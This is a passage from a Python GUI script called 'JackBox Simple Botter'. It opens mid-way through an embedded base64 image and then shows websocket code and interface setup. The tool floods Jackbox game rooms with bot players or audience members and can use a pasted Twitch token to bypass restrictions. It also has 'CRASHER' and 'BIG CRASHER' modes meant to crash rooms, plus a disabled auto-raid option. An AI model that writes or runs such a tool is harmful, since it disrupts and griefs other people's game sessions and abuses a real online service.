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0jQZy20GmoB2wDrjpYuv9TR2iucdU9omFZTTpDEFBCAgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASuC/PAbfS2O+2XQAAAAASUVORK5CYII="}}}
    def on_error(ws, error):
        #add_log(f'{nickname.replace("%20", "")} Error.')
        print(f'ERROR: ws - {ws} error - {error}')
    def on_close(ws, *args):
        global roomslist, drms, nicknameee
        print(f"ERROR: {ws} CODE: {args}")
              
        for obj in roomslist:

            #print(drms)
            #print(nicknameee)
            #print(drms[nicknameee.index(nickname)] == False)
            
            if obj['code'] == roomcode and obj['type'] == type and obj['bypass'] == bypass and drms[nicknameee.index(nickname)] == False:

                obj['num'] -= 1
                
                if obj['num'] == 0: roomslist.remove(obj)
                
        #add_log(f'{nickname.replace("%20", "")} Kicked.')
    def on_open(ws):...
#wss://ecast.jackboxgames.com/api/v2/audience/XZVY/play?role=audience&name=COMMAND&format=json&user-id=bcf8e533-1efd-418f-ace1-57ea3e250f23
    #print(f"wss://{host if type == 'player' else 'ecast.jackboxgames.com'}/api/v2/{'rooms' if type == 'player' else 'audience'}/{roomcode}/play?role={type}&name={nickname}&format=json&user-id={random.randint(10000000000000,999999999999999999999999)}")
    ws = websocket.WebSocketApp(f"wss://{host if type == 'player' else 'ecast.jackboxgames.com'}/api/v2/{'rooms' if type == 'player' else 'audience'}/{roomcode}/play?role={type}&name={nickname}&format=json&user-id={random.randint(10000000000000,999999999999999999999999)}{'&twitch-token='+TwitchToken_entry.get().replace(' ', '').replace('   ', '') if bypass else ''}",
                                    on_message = on_message,
                                    on_error = on_error,
                                    on_close = on_close,
                                    header={'Sec-Websocket-Extensions': 'permessage-deflate; client_max_window_bits',
                                    'Sec-Websocket-Key': 'hPqQ5E6c0/kl8z4Ygve1g==',
                                    'Sec-Websocket-Protocol': 'ecast-v0',
                                    'Sec-Websocket-Version': '13'})
    ws.on_open = on_open

    ws.run_forever()

Author_lbl = Label(window, text='By https://www.youtube.com/@strongplayer9761', fg='white', bg='black').pack()
Welcome_label = Label(window, text='JackBox Simple Botter', font=('Arial Black', 18), fg='white', bg='black').pack()
RoomCode_label = Label(window, text='Enter Room Code:', font=('Arial Black', 15), fg='white', bg='black').pack()
RoomCode_entry = Entry(window, fg='white', bg='black', width=10, font=('Arial Black', 8))
RoomCode_entry.pack()
NumberOfBots_label = Label(window, text='Enter the number of bots:', font=('Arial Black', 15), fg='white', bg='black').pack()
NumberOfBots_entry = Entry(window, fg='white', bg='black', width=10, font=('Arial Black', 8))
NumberOfBots_entry.pack()
NameOfBots_label = Label(window, text='Enter the bot names:', font=('Arial Black', 15), fg='white', bg='black').pack()
NameOfBots_entry = Entry(window, fg='white', bg='black', width=10, font=('Arial Black', 8))
NameOfBots_entry.pack()
TwitchToken_label = Label(window, text='Enter Twitch Token:', font=('Arial Black', 15), fg='white', bg='black').pack() #twitchtoken = ''
TwitchToken_entry = Entry(window, fg='white', bg='black', width=30, font=('Arial Black', 8))
TwitchToken_entry.pack()
ConfirmPlayers_button = Button(window, text='Confirm Players', font=('Arial Black', 10), fg='white', bg='black', command=lambda:threading.Thread(target=Botting, args=(RoomCode_entry.get(), 'player')).start()).pack()
ConfirmAudience_button = Button(window, text='Confirm Audience', font=('Arial Black', 10), fg='white', bg='black', command=lambda:threading.Thread(target=Botting, args=(RoomCode_entry.get(), 'audience')).start()).pack()
ConfirmCRASHER_button = Button(window, text='Confirm CRASHER (Players)', font=('Arial Black', 10), fg='white', bg='black', command=lambda:threading.Thread(target=Botting, args=(RoomCode_entry.get(), 'crasher')).start()).pack()
ConfirmBIGCRASHER_button = Button(window, text='Confirm BIG CRASHER (Players)', font=('Arial Black', 10), fg='white', bg='black', command=lambda:threading.Thread(target=Botting, args=(RoomCode_entry.get(), 'bigcrasher')).start()).pack()
#SHIT AND UNWORK - AutoRaid_button = Button(window, text='Auto Raid (Not Stopping)', font=('Arial Black', 10), fg='white', bg='black', command=lambda:threading.Thread(target=StartScanBotting).start()).pack() #threading.Thread(target=Scan).start()
Logs_label = Label(window, text='Logs:', font=('Arial Black', 15), fg='white', bg='black').pack()
log_text = Text(window, width=40, height=10)
log_text.config(state='disabled', font=('Arial Black', 9))
log_text.pack()

def stat():
    global Statistic_lbl

    root = Tk()
    root.title('Statistic')
    root.geometry('720x200')
    root.configure(bg='black')
    root.resizable(False, True)

    Statistic_lbl = Label(root, text='', font=('Arial Black', 10), fg='white', bg='black')
    Statistic_lbl.place(x=5, y=5)

    root.mainloop()

def statcheck():

    global roomslist, Statistic_lbl

    while True:

        time.sleep(0.5)

        res = ''

        for obj in roomslist:

            if obj['type'] == 'player' or obj['type'] == 'audience':

                res = f'Room: {obj["code"]}, Game: {obj["gamename"]}, Type: {obj["type"]}, Bypassing: {obj["bypass"]}, Number Of Bots: {obj["num"]}\n{res}'

            else:

                res = f'Room: {obj["code"]}, Game: {obj["gamename"]}, Type: {obj["type"]}, Bypassing: {obj["bypass"]}, Crashed: {obj["successful"]}\n{res}'
        
        Statistic_lbl.configure(text=res)

threading.Thread(target=stat).start()
threading.Thread(target=statcheck).start()

def CheckCFG():

    if not os.path.exists('C:\\JackBox Spammer Configuration.json'):

        with open('C:\\JackBox Spammer Configuration.json', 'w') as f:f.write('{"twitch_token": "", "number": "", "nicknames": ""}')
    
    else:

        #time.sleep(3)

        with open('C:\\JackBox Spammer Configuration.json', 'r') as f:
            #print(f.read())
            loaded_text = json.loads(str(f.read()))
            #print(loaded_text['twitch_token'])
            TwitchToken_entry.insert(0, loaded_text['twitch_token'])
            NumberOfBots_entry.insert(0, loaded_text['number'])
            NameOfBots_entry.insert(0, loaded_text['nicknames'])

threading.Thread(target=CheckCFG).start()

window.mainloop()
